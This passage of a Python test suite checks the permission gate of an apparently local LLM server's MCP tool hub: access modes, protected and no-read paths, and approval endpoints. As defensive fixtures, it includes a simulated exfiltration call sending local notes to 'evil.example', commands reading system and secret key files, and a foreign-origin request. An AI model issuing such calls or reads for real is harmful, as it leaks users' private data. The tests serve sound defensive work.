        self.start(call_script("fake__add", a=4, b=4), "</think>\n\neight")        # same tool, no click needed
        ev = self.run_mode("ask")
        self.assertEqual([e["event"] for e in ev], ["start", "call", "result"])
        self.assertEqual(ev[2]["text"], "8")
        self.start(call_script("fake__add", a=1, b=1), "</think>\n\nstill refused in read-only")
        ev = self.run_mode("read")                                                  # ... but not in a read-only chat
        self.assertTrue(ev[-1].get("denied"))

    def test_edit_mode_edits_but_asks_for_danger(self):
        self.make()
        self.start(call_script("fake__add", a=2, b=2), "</think>\n\nfour")
        ev = self.run_mode("edit")
        self.assertEqual([e["event"] for e in ev], ["start", "call", "result"])
        self.start(call_script("fake__big", n=5), "</think>\n\nbig")
        ev = self.run_mode("edit", answer=False)
        self.assertEqual([e["event"] for e in ev], ["start", "call", "approval", "result"])
        self.assertEqual(ev[2]["kind"], "danger")

    def test_full_runs_everything_and_off_offers_nothing(self):
        self.make()
        self.start(call_script("fake__big", n=5), "</think>\n\ndone")
        ev = self.run_mode("full")
        self.assertEqual([e["event"] for e in ev], ["start", "call", "result"])
        self.assertEqual(ev[2]["text"], "yyyyy")
        self.start("</think>\n\nno tools here")
        ev = self.run_mode("off")
        self.assertEqual(ev, [])
        self.assertNotIn("fake__", self.engine.prompt_text(0))

    def test_a_request_naming_no_mode_keeps_the_old_behaviour(self):
        self.make()
        self.start(call_script("fake__add", a=2, b=3), "</think>\n\nfive")
        body = {"model": "m", "messages": [{"role": "user", "content": "x"}], "stream": False, "strata_mcp": True}
        req = urllib.request.Request(self.base + "/v1/chat/completions", data=json.dumps(body).encode(),
                                     headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=30) as r:
            msg = json.loads(r.read())["choices"][0]["message"]
        self.assertEqual(msg["strata_mcp"][-1]["text"], "5")

    def test_bad_mode_is_a_400_and_status_lists_the_modes(self):
        self.make(permission="edit")
        self.start("</think>\n\nx")
        with self.assertRaises(urllib.error.HTTPError) as cm:
            self.open("root")
        self.assertEqual(cm.exception.code, 400)
        cm.exception.close()
        with urllib.request.urlopen(self.base + "/mcp", timeout=10) as r:
            st = json.loads(r.read())
        self.assertEqual([m["id"] for m in st["permissions"]["modes"]], list(MODES))
        self.assertEqual(st["permissions"]["default"], "edit")
        kinds = {t["tool"]: t["kind"] for t in st["servers"][0]["tools"]}
        self.assertEqual((kinds["echo"], kinds["add"], kinds["big"]), ("read", "write", "danger"))

    def make_protected(self, **settings):
        self.prot = os.path.join(tempfile.gettempdir(), "strata_protected_probe")
        self.make(protected_paths=[self.prot], tool_classes={"echo": "write", "add": "write", "big": "danger"}, **settings)
        return os.path.join(self.prot, "notes", "todo.txt"), os.path.join(tempfile.gettempdir(), "strata_other_probe", "x.txt")

    def test_protected_path_asks_even_in_full_access(self):
        inside, outside = self.make_protected()
        self.start(call_script("fake__echo", text=outside), "</think>\n\nelsewhere")
        ev = self.run_mode("full")                                                  # not protected: no click in full access
        self.assertEqual([e["event"] for e in ev], ["start", "call", "result"])
        self.start(call_script("fake__echo", text=inside), "</think>\n\nprotected")
        ev = self.run_mode("full", answer=True)                                     # protected: asks in full access too
        self.assertEqual([e["event"] for e in ev], ["start", "call", "approval", "result"])
        self.assertTrue(ev[2]["protected"])
        self.assertEqual((ev[3]["ok"], ev[3]["text"]), (True, inside))

    def test_protected_path_deny_never_runs_and_always_does_not_stick(self):
        inside, _ = self.make_protected()
        self.start(call_script("fake__echo", text=inside), "</think>\n\nno")
        ev = self.run_mode("edit", answer=False)
        self.assertEqual((ev[-1]["ok"], ev[-1].get("denied")), (False, True))
        self.assertFalse(self.ran("echo"))
        self.start(call_script("fake__echo", text=inside), "</think>\n\nyes")
        self.run_mode("ask", answer=True, always=True)                              # "Always allow" is ignored here ...
        self.assertTrue(self.ran("echo"))
        self.start(call_script("fake__echo", text=inside), "</think>\n\nagain")
        ev = self.run_mode("ask", answer=True)                                      # ... so it asks again
        self.assertEqual([e["event"] for e in ev], ["start", "call", "approval", "result"])

    def test_protected_path_is_refused_in_read_only_and_reads_are_free(self):
        inside, _ = self.make_protected()
        self.start(call_script("fake__echo", text=inside), "</think>\n\nrefused")
        ev = self.run_mode("read")
        self.assertEqual([e["event"] for e in ev], ["start", "call", "result"])
        self.assertTrue(ev[2].get("denied"))
        self.assertFalse(self.ran("echo"))
        self.hub.close()
        self.hub = None
        self.make(protected_paths=[self.prot], tool_classes={"echo": "read"})       # the same tool, a read: no click
        self.start(call_script("fake__echo", text=inside), "</think>\n\nlooked")
        ev = self.run_mode("full")
        self.assertEqual([e["event"] for e in ev], ["start", "call", "result"])
        self.assertTrue(ev[2]["ok"])

    def test_no_read_list_refuses_in_every_mode(self):
        tmp = os.path.join(tempfile.gettempdir(), "strata_block_probe")
        self.make(blocked_paths=[os.path.join(tmp, "secret")])            # fake__echo is a read tool: it would run anywhere else
        for mode in ("read", "ask", "edit", "full"):
            self.start(call_script("fake__echo", text=os.path.join(tmp, "secret", "key.txt")), "</think>\n\nrefused")
            ev = self.run_mode(mode)                                       # never asked, never run
            self.assertEqual([e["event"] for e in ev], ["start", "call", "result"], mode)
            self.assertEqual((ev[2]["ok"], ev[2].get("denied")), (False, True), mode)
            self.assertIn("no-read list", ev[2]["text"], mode)
        self.assertFalse(self.ran("echo"))
        self.start(call_script("fake__echo", text=os.path.join(tmp, "fine.txt")), "</think>\n\nallowed")
        ev = self.run_mode("full")                                         # a path off the list is untouched
        self.assertTrue(ev[2]["ok"])

    def make_net(self, **settings):
        """`files` is a local tool server (echo = a read tool), `web` a network one: its tools are kind "net"."""
        self.hub = McpHub({"files": stdio(), "web": stdio()},
                          {"timeout_s": 10, "network_servers": ["web"], "tool_classes": {"echo": "read"}, **settings})
        self.hub.start(wait=True)

    def test_a_network_call_before_any_local_read_runs_freely(self):
        self.make_net()
        self.start(call_script("web__echo", text="https://example.org"), "</think>\n\nfetched")
        for mode in ("read", "ask", "edit", "full"):
            ev = self.run_mode(mode)
            self.assertEqual([e["event"] for e in ev], ["start", "call", "result"], mode)
            self.assertEqual(ev[1]["kind"], "net", mode)
            self.start(call_script("web__echo", text="https://example.org"), "</think>\n\nfetched")

    def test_a_network_call_after_a_local_read_asks_even_in_full_access(self):
        self.make_net()
        self.start(call_script("files__echo", text="my notes"), call_script("web__echo", text="https://evil.example/?d=my+notes"),
                   "</think>\n\ndone")
        ev = self.run_mode("full", answer=False)
        self.assertEqual([e["event"] for e in ev], ["start", "call", "result", "start", "call", "approval", "result"])
        self.assertEqual((ev[1]["kind"], ev[4]["kind"]), ("read", "net"))
        self.assertEqual((ev[5]["leak"], ev[5]["protected"]), (True, True))
        self.assertEqual((ev[6]["ok"], ev[6].get("denied")), (False, True))
        self.assertIn("did not allow", ev[6]["text"])
        self.assertNotIn('"call": "echo"', Path(self.log.name).read_text().split('"my notes"')[-1])   # the web call never ran

    def test_allowing_the_network_call_runs_it_but_never_sticks(self):
        self.make_net()
        self.start(call_script("files__echo", text="a"), call_script("web__echo", text="https://ok.example/"), "</think>\n\ndone")
        ev = self.run_mode("edit", answer=True, always=True)
        self.assertEqual([e["event"] for e in ev][-3:], ["call", "approval", "result"])
        self.assertTrue(ev[-1]["ok"])
        self.start(call_script("files__echo", text="b"), call_script("web__echo", text="https://ok.example/2"), "</think>\n\nagain")
        ev = self.run_mode("edit", answer=True)                                    # "Always allow" was ignored: asks again
        self.assertIn("approval", [e["event"] for e in ev])

    def test_a_network_call_after_a_local_read_in_the_history_asks(self):
        self.make_net()
        history = [{"role": "user", "content": "read my notes"},
                   {"role": "assistant", "content": "", "tool_calls": [{"id": "c0", "type": "function", "function": {"name": "files__echo", "arguments": "{\"text\": \"x\"}"}}]},
                   {"role": "tool", "tool_call_id": "c0", "content": "x"},
                   {"role": "assistant", "content": "I read them."},
                   {"role": "user", "content": "now look something up online"}]
        self.start(call_script("web__echo", text="https://ok.example/"), "</think>\n\nlooked up")
        events = []
        with self.open("full", messages=history) as r:
            for raw in r:
                line = raw.decode()
                if line.startswith("data: {") and json.loads(line[6:]).get("strata_mcp"):
                    x = json.loads(line[6:])["strata_mcp"]
                    events.append(x["event"])
                    if x["event"] == "approval":
                        self.assertTrue(x["leak"])
                        self.assertEqual(self.approve(x["approval"], False), 200)
        self.assertEqual(events, ["start", "call", "approval", "result"])

    def test_status_marks_the_network_tools(self):
        self.make_net()
        self.start("</think>\n\nx")
        with urllib.request.urlopen(self.base + "/mcp", timeout=10) as r:
            st = json.loads(r.read())
        kinds = {s["name"]: {t["tool"]: t["kind"] for t in s["tools"]} for s in st["servers"]}
        self.assertEqual((kinds["files"]["echo"], kinds["web"]["echo"], kinds["web"]["add"]), ("read", "net", "net"))
        self.assertEqual(settings_from({"mcp": {"network_servers": ["web"]}}), {"network_servers": ["web"]})
        with self.assertRaises(SystemExit):
            settings_from({"mcp": {"network_servers": "web"}})

    def run_ask(self, mode, text=None):
        """One chat in `mode`; answers the first ask_user question with `text` (None: nobody answers).  -> mcp events."""
        events, asked = [], False
        with self.open(mode) as r:
            for raw in r:
                line = raw.decode()
                if not line.startswith("data: {"):
                    continue
                x = json.loads(line[6:]).get("strata_mcp")
                if not x:
                    continue
                events.append(x)
                if x["event"] == "question" and not asked and text is not None:
                    asked = True
                    req = urllib.request.Request(self.base + "/mcp/answer", data=json.dumps({"approval": x["approval"], "text": text}).encode(),
                                                 headers={"Content-Type": "application/json"})
                    with urllib.request.urlopen(req, timeout=10) as resp:
                        self.assertEqual(resp.status, 200)
        return events

    def test_ask_user_waits_for_the_answer_and_gives_it_to_the_model(self):
        self.make()
        self.start(call_script("strata__ask_user", question="Which folder?", options='["notes", "projects"]'),
                   "</think>\n\nthanks, projects it is")
        ev = self.run_ask("ask", "projects")
        self.assertEqual([e["event"] for e in ev], ["start", "call", "question", "result"])
        self.assertEqual((ev[1]["kind"], ev[1]["server"]), ("ask", "strata"))
        self.assertEqual((ev[2]["question"], ev[2]["options"]), ("Which folder?", ["notes", "projects"]))
        self.assertEqual((ev[3]["ok"], ev[3]["text"]), (True, "projects"))
        self.assertIn("<tool_response>\nprojects\n</tool_response>", self.engine.prompt_text(1))   # the model read the answer

    def test_ask_user_runs_in_every_mode_that_offers_tools_and_times_out(self):
        self.make(approval_timeout_s=1.5)
        for mode in ("read", "ask", "edit", "full"):
            self.start(call_script("strata__ask_user", question="Sure?"), "</think>\n\nok")
            ev = self.run_ask(mode, "yes")
            self.assertEqual([e["event"] for e in ev], ["start", "call", "question", "result"], mode)
            self.assertEqual(ev[3]["text"], "yes", mode)
        self.start(call_script("strata__ask_user", question="Anyone there?"), "</think>\n\nno one answered")
        ev = self.run_ask("ask", None)                                                  # nobody answers
        self.assertEqual((ev[3]["ok"], ev[3]["text"]), (False, "error: the user did not answer in time"))
        self.start("</think>\n\nx")
        self.run_ask("off", None)
        self.assertNotIn("ask_user", self.engine.prompt_text(0))                        # "No tools" offers no question either

    def test_ask_user_can_be_turned_off_and_is_listed(self):
        self.make(ask_user=False)
        self.start("</think>\n\nx")
        with self.open("ask") as r:
            r.read()
        self.assertNotIn("ask_user", self.engine.prompt_text(0))
        self.hub.close()
        self.make()
        self.start("</think>\n\nx")
        with urllib.request.urlopen(self.base + "/mcp", timeout=10) as r:
            st = json.loads(r.read())
        kinds = {s["name"]: {t["tool"]: t["kind"] for t in s["tools"]} for s in st["servers"]}
        self.assertEqual(kinds["strata"], {"ask_user": "ask"})
        self.assertEqual((decide("read", "ask"), decide("full", "ask"), decide("off", "ask")), ("allow", "allow", "deny"))
        with self.assertRaises(SystemExit):
            settings_from({"mcp": {"ask_user": "yes"}})

    def test_answer_endpoint_guards(self):
        self.make()
        self.start("</think>\n\nx")

        def post(body, headers=None, ctype="application/json"):
            data = json.dumps(body).encode() if isinstance(body, dict) else body
            req = urllib.request.Request(self.base + "/mcp/answer", data=data, headers={"Content-Type": ctype, **(headers or {})})
            try:
                with urllib.request.urlopen(req, timeout=10) as r:
                    return r.status
            except urllib.error.HTTPError as e:
                with e:
                    return e.code
        self.assertEqual(post({"approval": "nope", "text": "x"}), 404)                  # no such waiting question
        self.assertEqual(post({"text": "x"}), 400)
        self.assertEqual(post({"approval": "t", "text": 5}), 400)
        self.assertEqual(post({"approval": "t", "text": "x"}, {"Origin": "http://evil.example"}), 403)
        self.assertEqual(post(b"approval=t&text=x", ctype="application/x-www-form-urlencoded"), 415)

    def make_exec(self, **settings):
        """`exec` is a server listed in exec_servers: every one of its tools is kind "exec" (a command or a program)."""
        self.hub = McpHub({"exec": stdio()}, {"timeout_s": 10, "exec_servers": ["exec"], **settings})
        self.hub.start(wait=True)

    def test_a_command_asks_in_ask_and_edit_modes_and_runs_by_itself_in_full_access(self):
        self.make_exec()
        for mode in ("ask", "edit"):
            self.start(call_script("exec__echo", text="hello"), "</think>\n\ndone")
            ev = self.run_mode(mode, answer=True)
            self.assertEqual([e["event"] for e in ev], ["start", "call", "approval", "result"], mode)
            self.assertEqual((ev[1]["kind"], ev[2]["exec"], ev[2]["protected"]), ("exec", True, False), mode)
            self.assertEqual((ev[3]["ok"], ev[3]["text"]), (True, "hello"), mode)
        self.start(call_script("exec__echo", text="hello"), "</think>\n\ndone")
        ev = self.run_mode("full")                                                    # no click at all
        self.assertEqual([e["event"] for e in ev], ["start", "call", "result"])
        self.assertEqual((ev[2]["ok"], ev[2]["text"]), (True, "hello"))

    def test_always_allow_covers_a_command_but_not_one_naming_a_protected_place(self):
        self.make_exec(protected_paths=["C:\\"])
        self.start(call_script("exec__echo", text="one"), "</think>\n\ndone")
        self.run_mode("edit", answer=True, always=True)                               # "Always allow" is clicked ...
        self.assertEqual(self.hub.gate.always, {"exec__echo"})
        self.start(call_script("exec__echo", text="two"), "</think>\n\ndone")
        ev = self.run_mode("edit")                                                    # ... so it no longer asks
        self.assertEqual([e["event"] for e in ev], ["start", "call", "result"])
        for text in ("dir C:\\Users", "echo %USERPROFILE%", "type C:/Windows/win.ini"):
            self.start(call_script("exec__echo", text=text), "</think>\n\nasked")
            ev = self.run_mode("full", answer=False)                                  # a protected place always asks
            self.assertIn("approval", [e["event"] for e in ev], text)
            self.assertTrue([e for e in ev if e["event"] == "approval"][0]["protected"], text)

    def test_a_denied_command_never_runs_and_read_only_refuses_without_asking(self):
        self.make_exec()
        self.start(call_script("exec__echo", text="nope"), "</think>\n\nnot run")
        ev = self.run_mode("edit", answer=False)
        self.assertEqual((ev[-1]["ok"], ev[-1].get("denied")), (False, True))
        self.assertFalse(self.ran("echo"))
        self.start(call_script("exec__echo", text="nope"), "</think>\n\nrefused")
        ev = self.run_mode("read")                                                    # never asked, never run
        self.assertEqual([e["event"] for e in ev], ["start", "call", "result"])
        self.assertTrue(ev[2].get("denied"))
        self.assertFalse(self.ran("echo"))
        self.start("</think>\n\nx")
        self.run_mode("off")
        self.assertNotIn("exec__", self.engine.prompt_text(0))                        # "No tools" offers none

    def test_the_text_of_a_command_is_read_for_blocked_places(self):
        tmp = os.path.join(tempfile.gettempdir(), "strata_exec_probe")
        self.make_exec(blocked_paths=[os.path.join(tmp, "secret")])
        self.start(call_script("exec__echo", text='type "' + os.path.join(tmp, "secret", "k.txt") + '"'), "</think>\n\nrefused")
        ev = self.run_mode("full")                                                    # refused before any click is asked for
        self.assertEqual([e["event"] for e in ev], ["start", "call", "result"])
        self.assertIn("no-read list", ev[2]["text"])
        self.assertFalse(self.ran("echo"))
        self.start(call_script("exec__echo", text='type "' + os.path.join(tmp, "fine.txt") + '"'), "</think>\n\nasked")
        ev = self.run_mode("edit", answer=False)                                      # an unlisted place asks in Allow edits
        self.assertIn("approval", [e["event"] for e in ev])

    def test_exec_servers_in_status_and_settings(self):
        self.make_exec()
        self.start("</think>\n\nx")
        with urllib.request.urlopen(self.base + "/mcp", timeout=10) as r:
            st = json.loads(r.read())
        kinds = {t["tool"]: t["kind"] for t in st["servers"][0]["tools"]}
        self.assertEqual(set(kinds.values()), {"exec"})
        self.assertEqual(settings_from({"mcp": {"exec_servers": ["exec"]}}), {"exec_servers": ["exec"]})
        for bad in ("exec", [""], [3]):
            with self.assertRaises(SystemExit):
                settings_from({"mcp": {"exec_servers": bad}})
        self.assertEqual([decide(m, "exec") for m in ("off", "read", "ask", "edit", "full")], ["deny", "deny", "ask", "ask", "allow"])

    def test_approve_endpoint_guards(self):
        self.make()
        self.start("</think>\n\nx")
        self.assertEqual(self.approve("nope", True), 404)                           # no such waiting call
        self.assertEqual(self.approve("", True, body={"allow": True}), 400)         # no token
        self.assertEqual(self.approve("", True, body={"approval": "x", "allow": "yes"}), 400)   # not a boolean
        self.assertEqual(self.approve("t", True, headers={"Origin": "http://evil.example"}), 403)   # a foreign page
        req = urllib.request.Request(self.base + "/mcp/approve", data=b"approval=x&allow=true",
                                     headers={"Content-Type": "application/x-www-form-urlencoded"})
        with self.assertRaises(urllib.error.HTTPError) as cm:                       # a plain form post
            urllib.request.urlopen(req, timeout=10)
        self.assertEqual(cm.exception.code, 415)
        cm.exception.close()


class DevToolsRespectTheNoReadList(unittest.TestCase):
    """The hub gives the no-read list to the programs it starts (STRATA_BLOCKED_JSON), so tools/strata_dev_mcp.py skips
    those places while it walks: the model never sees a name or a line from them."""

    def test_grep_through_the_hub(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = os.path.realpath(tmp)
            for rel, text in (("ok/a.txt", "needle one\n"), ("vault/b.txt", "needle two\n"), ("ok/key.pem", "needle three\n")):
                os.makedirs(os.path.dirname(os.path.join(root, rel)), exist_ok=True)
                Path(root, rel).write_text(text, encoding="utf-8")
            dev = {"command": sys.executable, "args": [str(ROOT / "tools" / "strata_dev_mcp.py")]}
            hub = McpHub({"dev": dev}, {"timeout_s": 20, "blocked_paths": [os.path.join(root, "vault"), "*.pem"]})
            hub.start(wait=True)
            try:
                r = hub.call("dev__grep", {"pattern": "needle", "path": root})
                self.assertTrue(r["ok"], r["text"])
                self.assertIn("1 match in 1 file", r["text"])
                self.assertIn("a.txt", r["text"])
                self.assertNotIn("vault", r["text"].split("\n\n", 1)[-1])
                self.assertNotIn("key.pem", r["text"].split("\n\n", 1)[-1])
                self.assertEqual(hub.kind_of("dev__grep"), "read")                  # a search is a read: no click needed
                self.assertEqual((hub.kind_of("dev__glob"), hub.kind_of("dev__read_lines")), ("read", "read"))
                self.assertTrue(hub.blocked({"path": os.path.join(root, "vault")}))  # and the hub refuses a call that names it
            finally:
                hub.close()


class NoServers(unittest.TestCase):
    def test_opt_in_without_servers_is_a_plain_chat(self):
        tok = ByteTokenizer()
        svc = Service(ScriptedEngine(tok, ["</think>\n\nhi"]), tok, ChatTemplate(ROOT / "serve/chat_template.jinja"))
        httpd = serve(svc, port=0)
        try:
            base = f"http://127.0.0.1:{httpd.server_address[1]}"
            with urllib.request.urlopen(base + "/mcp", timeout=10) as r:
                self.assertEqual(json.loads(r.read()), {"servers": [], "tools": 0})
            req = urllib.request.Request(base + "/v1/chat/completions", data=json.dumps(
                {"model": "m", "messages": [{"role": "user", "content": "x"}], "strata_mcp": True}).encode(),
                headers={"Content-Type": "application/json"})
            with urllib.request.urlopen(req, timeout=10) as r:
                self.assertEqual(json.loads(r.read())["choices"][0]["message"]["content"], "hi")
        finally:
            httpd.shutdown()
            httpd.server_close()


if __name__ == "__main__":
    unittest.main()
